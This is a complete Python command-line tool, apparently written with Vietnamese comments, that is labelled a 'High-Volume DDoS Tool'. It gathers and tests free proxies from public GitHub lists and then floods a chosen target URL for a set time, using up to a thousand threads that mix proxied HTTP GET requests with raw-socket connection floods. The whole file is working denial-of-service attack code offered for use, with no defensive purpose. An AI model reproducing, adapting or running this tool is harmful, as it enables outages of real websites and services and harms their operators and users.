#!/usr/bin/env python3
import requests
import argparse
import json
import time
import random
import string
import threading
import queue
import socket
import socks
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

init(autoreset=True)

class HighVolumeDDoS:
    def __init__(self, target_url, output_file=None, duration=300, threads=1000, proxy_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.duration = duration
        self.threads = threads
        self.session = requests.Session()
        self.results = {
            "target": target_url,
            "start_time": "",
            "end_time": "",
            "duration": duration,
            "threads": threads,
            "requests_sent": 0,
            "successful_requests": 0,
            "failed_requests": 0,
            "requests_per_second": 0,
            "proxies_used": 0,
            "attack_methods": []
        }
        
        self.proxies = []
        self.proxy_queue = queue.Queue()
        self.stop_event = threading.Event()
        self.stats_queue = queue.Queue()
        self.start_time = 0
        
        # Tối ưu hóa headers để giảm kích thước request
        self.minimal_headers = {
            "User-Agent": "M/5.0",
            "Accept": "*/*",
            "Connection": "keep-alive"
        }
        
        # Payload tối giản để tăng tốc độ
        self.paths = ["/", "/index.html", "/home", "/main", "/default"]
        
        # User agents ngắn nhất
        self.user_agents = [
            "M/5.0", "C/91.0", "F/89.0", "S/14.1", "E/91.0"
        ]
        
        # Load proxies from file if provided
        if proxy_file:
            self.load_proxies_from_file(proxy_file)
    
    def load_proxies_from_file(self, file_path):
        try:
            with open(file_path, 'r') as f:
                proxies = f.read().splitlines()
            
            for proxy in proxies:
                if proxy.strip():
                    self.proxies.append(proxy.strip())
            
            print(f"{Fore.GREEN}[+] Loaded {len(self.proxies)} proxies from {file_path}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error loading proxies from file: {str(e)}")
    
    def fetch_proxies(self):
        print(f"{Fore.YELLOW}[+] Fetching proxies from online sources...")
        
        # Proxy sources with high-quality proxies
        proxy_sources = [
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt"
        ]
        
        for source in proxy_sources:
            try:
                print(f"{Fore.BLUE}[*] Fetching proxies from {source}")
                response = requests.get(source, verify=False, timeout=10)
                proxies = response.text.splitlines()
                
                for proxy in proxies:
                    if proxy.strip():
                        self.proxies.append(proxy.strip())
                
                print(f"{Fore.GREEN}[+] Fetched {len(proxies)} proxies from {source}")
            except Exception as e:
                print(f"{Fore.RED}[-] Error fetching proxies from {source}: {str(e)}")
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"{Fore.GREEN}[+] Total unique proxies: {len(self.proxies)}")
        
        # Add proxies to queue
        for proxy in self.proxies:
            self.proxy_queue.put(proxy)
        
        self.results["proxies_used"] = len(self.proxies)
    
    def test_proxy(self, proxy):
        try:
            proxy_dict = {
                "http": f"http://{proxy}",
                "https": f"http://{proxy}"
            }
            
            # Test with minimal request
            response = requests.get("http://httpbin.org/ip", proxies=proxy_dict, timeout=3)
            return response.status_code == 200
        except:
            return False
    
    def test_proxies(self):
        print(f"{Fore.YELLOW}[+] Testing proxies...")
        
        working_proxies = []
        
        # Test proxies in parallel
        with ThreadPoolExecutor(max_workers=100) as executor:
            results = list(executor.map(self.test_proxy, self.proxies))
        
        for i, result in enumerate(results):
            if result:
                working_proxies.append(self.proxies[i])
                if len(working_proxies) % 100 == 0:
                    print(f"{Fore.GREEN}[+] {len(working_proxies)} working proxies found")
        
        self.proxies = working_proxies
        print(f"{Fore.GREEN}[+] Working proxies: {len(self.proxies)}")
        
        # Add working proxies to queue
        for proxy in self.proxies:
            self.proxy_queue.put(proxy)
        
        self.results["proxies_used"] = len(self.proxies)
    
    def high_volume_flood(self):
        while not self.stop_event.is_set():
            try:
                # Lấy proxy từ hàng đợi hoặc sử dụng trực tiếp nếu không còn proxy
                if not self.proxy_queue.empty():
                    proxy = self.proxy_queue.get()
                    proxy_dict = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }
                    use_proxy = True
                else:
                    proxy_dict = None
                    use_proxy = False
                
                # Tạo request tối giản
                url = f"{self.target_url}{random.choice(self.paths)}"
                
                # Tối ưu hóa headers
                headers = self.minimal_headers.copy()
                headers["User-Agent"] = random.choice(self.user_agents)
                
                # Tạo và gửi request
                if use_proxy:
                    try:
                        response = requests.get(
                            url, 
                            headers=headers, 
                            proxies=proxy_dict, 
                            verify=False, 
                            timeout=5,
                            stream=True  # Stream để giảm memory usage
                        )
                        
                        # Chỉ đọc status code, không đọc content
                        status_code = response.status_code
                        
                        # Trả proxy về hàng đợi
                        self.proxy_queue.put(proxy)
                    except:
                        # Trả proxy về hàng đợi ngay cả khi có lỗi
                        self.proxy_queue.put(proxy)
                        status_code = 0
                else:
                    try:
                        response = requests.get(
                            url, 
                            headers=headers, 
                            verify=False, 
                            timeout=5,
                            stream=True
                        )
                        status_code = response.status_code
                    except:
                        status_code = 0
                
                # Gửi thống kê
                self.stats_queue.put(("request", status_code))
                
                # Không có delay để tăng tốc độ
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
    
    def ultra_fast_flood(self):
        # Sử dụng socket trực tiếp để tăng tốc độ tối đa
        parsed_url = urllib.parse.urlparse(self.target_url)
        host = parsed_url.netloc
        port = 443 if parsed_url.scheme == "https" else 80
        path = parsed_url.path if parsed_url.path else "/"
        
        while not self.stop_event.is_set():
            try:
                # Tạo socket
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                
                # Kết nối
                s.connect((host, port))
                
                # Tạo HTTP request tối giản
                request = f"GET {path} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "User-Agent: M/5.0\r\n"
                request += "Connection: close\r\n"
                request += "\r\n"
                
                # Gửi request
                s.send(request.encode())
                
                # Đóng socket ngay lập tức
                s.close()
                
                # Gửi thống kê
                self.stats_queue.put(("request", 200))
            except:
                self.stats_queue.put(("error", "Connection failed"))
    
    def stats_collector(self):
        self.start_time = time.time()
        self.results["start_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        
        while not self.stop_event.is_set():
            try:
                stat_type, stat_value = self.stats_queue.get(timeout=0.1)
                
                if stat_type == "request":
                    self.results["requests_sent"] += 1
                    if 200 <= stat_value < 300:
                        self.results["successful_requests"] += 1
                    else:
                        self.results["failed_requests"] += 1
                elif stat_type == "error":
                    self.results["requests_sent"] += 1
                    self.results["failed_requests"] += 1
            except queue.Empty:
                pass
            
            # Cập nhật RPS mỗi giây
            elapsed = time.time() - self.start_time
            self.results["requests_per_second"] = self.results["requests_sent"] / elapsed if elapsed > 0 else 0
            
            # In thống kê mỗi 5 giây
            if int(time.time()) % 5 == 0:
                print(f"{Fore.CYAN}[*] Requests: {self.results['requests_sent']} | RPS: {self.results['requests_per_second']:.2f} | Success: {self.results['successful_requests']} | Failed: {self.results['failed_requests']}")
        
        self.results["end_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    def run_attack(self):
        print(f"{Fore.CYAN}[*] Starting high-volume DDoS attack on {self.target_url}")
        print(f"{Fore.CYAN}[*] Duration: {self.duration} seconds")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        
        # Start stats collector thread
        stats_thread = threading.Thread(target=self.stats_collector)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack threads
        threads = []
        
        # Chia đều giữa hai phương thức tấn công
        half_threads = self.threads // 2
        
        # Start high_volume_flood threads
        for i in range(half_threads):
            t = threading.Thread(target=self.high_volume_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Start ultra_fast_flood threads
        for i in range(self.threads - half_threads):
            t = threading.Thread(target=self.ultra_fast_flood)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop_event.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        # Save results
        if self.output_file:
            with open(self.output_file, "w") as f:
                json.dump(self.results, f, indent=4)
            print(f"{Fore.CYAN}[*] Results saved to {self.output_file}")
        
        print(f"{Fore.CYAN}[*] Attack completed")
        print(f"{Fore.CYAN}[*] Total requests: {self.results['requests_sent']}")
        print(f"{Fore.CYAN}[*] Successful requests: {self.results['successful_requests']}")
        print(f"{Fore.CYAN}[*] Failed requests: {self.results['failed_requests']}")
        print(f"{Fore.CYAN}[*] Average RPS: {self.results['requests_per_second']:.2f}")
        print(f"{Fore.CYAN}[*] Proxies used: {self.results['proxies_used']}")
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description="High-Volume DDoS Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-d", "--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads (default: 1000)")
    parser.add_argument("-p", "--proxy-file", help="File containing proxies (one per line)")
    
    args = parser.parse_args()
    
    ddos_tool = HighVolumeDDoS(
        target_url=args.url,
        output_file=args.output,
        duration=args.duration,
        threads=args.threads,
        proxy_file=args.proxy_file
    )
    
    # Fetch proxies if no proxy file provided
    if not args.proxy_file:
        ddos_tool.fetch_proxies()
    
    # Test proxies
    ddos_tool.test_proxies()
    
    # Run attack
    ddos_tool.run_attack()

if __name__ == "__main__":
    main()
